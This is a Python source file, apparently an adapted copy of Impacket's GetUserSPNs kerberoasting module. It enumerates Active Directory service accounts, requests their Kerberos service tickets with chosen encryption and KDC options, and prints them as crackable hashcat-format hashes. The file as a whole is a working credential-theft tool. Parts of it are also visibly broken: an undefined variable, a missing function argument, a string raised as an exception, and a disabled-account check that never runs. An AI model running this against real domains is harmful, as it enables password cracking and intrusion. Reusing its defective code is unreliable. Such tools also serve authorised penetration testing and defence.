#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This module will try to find Service Principal Names that are associated with normal user account.
#   Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#   will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#   bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#   This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#   https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#   Original idea of implementing this in Python belongs to @skelsec and his
#   https://github.com/skelsec/PyKerberoast project
#
#   This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#   Also, disabled accounts won't be shown.
#
# Author:
#   Alberto Solino (@agsolino)
#
# ToDo:
#   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#   [X] Improve the search filter, we have to specify we don't want machine accounts in the answer
#       (play with userAccountControl)
#

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys
import json
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection
from impacket.ntlm import compute_lmhash, compute_nthash

from powerview.lib.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS

class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions, identity=None, options=None, encType=None, TGT=None):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = cmdLineOptions.auth_aes_key
        self.__doKerberos = cmdLineOptions.use_kerberos
        self.__requestTGS = True
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__TGT = TGT
        self.__requestUser = identity
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != target_domain and self.__kdcHost:
            logging.warning('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None

        #opsec options
        self.__encryption = encType
        self.__options = options

    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise 'Error while anonymous logging into %s'
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    def getTGT(self, encType):
        if self.__doKerberos:
            domain, _, TGT, _ = CCache.parseFile(self.__domain)
            if TGT is not None:
                return TGT
        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost, encType=encType)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost, encType=encType)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost, encType=encType)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey
        return TGT

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            return entry
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            return entry
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            return entry
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            return entry
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

    def run(self, entries):
        answers = []
        entries_out = []
        entry_out = {}

        logging.debug('Total of records returned %d' % len(entries))
        for entry in entries:
            mustCommit = False
            sAMAccountName =  ''
            dn = entry.get('dn')
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                entry_out['attributes'] = {'distinguishedName': dn}
                for attribute,value in entry['attributes'].items():
                    if str(attribute) == 'sAMAccountName':
                        sAMAccountName = entry['attributes']['sAMAccountName'][0] if isinstance(entry['attributes']['sAMAccountName'], list) else entry['attributes']['sAMAccountName']
                        mustCommit = True
                    elif str(attribute) == 'memberOf':
                        memberOf = entry['attributes']['memberOf']
                    elif str(attribute) == 'servicePrincipalName':
                        SPNs = entry['attributes']['servicePrincipalName'] if isinstance(entry['attributes']['servicePrincipalName'], list) else [entry['attributes']['servicePrincipalName']]
                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers)>0:
            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict( (vals[1], vals[0]) for vals in answers)

                TGT = None

                # Check for forced encryption
                enctype = self.__encryption

                if self.__TGT and not enctype:
                    TGT = self.__TGT
                else:
                    TGT = self.getTGT(enctype)

                # convert hex to binary
                kdcopt = self.__options
                if kdcopt == None:
                    kdcopt = "0x40810010"

                scale = 16
                kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)

                # enable options based on binary (left to right)
                opt = list()
                kdc_opts = list()
                idx = -1
                for b in kdcbin:
                    idx += 1
                    if int(b) == 1:
                        opt.append(constants.KDCOptions(idx).value)
                        kdc_opts.append(constants.KDCOptions(idx).name)

                logging.debug("Using KDC Options (" + ','.join(kdc_opts) + ")")
                
                for user, SPN in users.items():
                    sAMAccountName = user
                    downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName

                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        try:
                            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                    self.__kdcHost,
                                                                                    TGT['KDC_REP'], TGT['cipher'],
                                                                                    TGT['sessionKey'], opt, enctype)
                        except:
                            logging.error(f"User {principalName} does not support AES encryption")
                            continue

                        sess_key = self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName)
                        entry_out['attributes'] = {'sAMAccountName': sAMAccountName,
                                               'servicePrincipalName': SPN,
                                               'Hash': sess_key
                                               }
                        entries_out.append(entry_out.copy())
                    except Exception as e:
                        logging.debug("Exception:", exc_info=True)
                        logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))
            return entries_out

        else:
            logging.error("No entries found!")

    def request_users_file_TGSs(self):

        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        # Get a TGT for the current user
        TGT = self.getTGT()

        for username in usernames:
            try:
                principalName = Principal()
                principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                principalName.components = [username]

                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                        self.__kdcHost,
                                                                        TGT['KDC_REP'], TGT['cipher'],
                                                                        TGT['sessionKey'])
                self.outputTGS(tgs, oldSessionKey, sessionKey, username, username)
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.error('Principal: %s - %s' % (username, str(e)))
